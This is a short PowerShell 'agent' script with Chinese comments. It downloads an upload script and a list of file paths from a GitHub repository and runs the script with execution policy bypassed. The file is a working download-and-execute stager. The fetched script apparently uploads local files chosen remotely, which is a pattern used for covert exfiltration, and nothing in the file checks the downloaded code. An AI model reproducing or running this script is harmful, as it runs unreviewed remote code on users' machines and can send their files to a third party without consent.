# agent.ps1 - 拉取远程上传任务并执行
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

$tempDir = "$env:TEMP\github-agent"
if (-Not (Test-Path $tempDir)) {
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
}

# 拉取远程上传脚本
$uploadScriptUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/remote-upload.ps1"
$uploadPathsUrl  = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/upload-paths.txt"

$uploadScriptPath = "$tempDir\remote-upload.ps1"
$uploadPathsPath  = "$tempDir\upload-paths.txt"

try {
    Invoke-WebRequest -Uri $uploadScriptUrl -OutFile $uploadScriptPath -UseBasicParsing -ErrorAction Stop
    Invoke-WebRequest -Uri $uploadPathsUrl -OutFile $uploadPathsPath -UseBasicParsing -ErrorAction Stop
    Write-Host "✅ 成功拉取远程脚本，准备执行上传任务..."
    & powershell -ExecutionPolicy Bypass -File $uploadScriptPath
} catch {
    Write-Warning "❌ 拉取或执行失败：$($_.Exception.Message)"
}

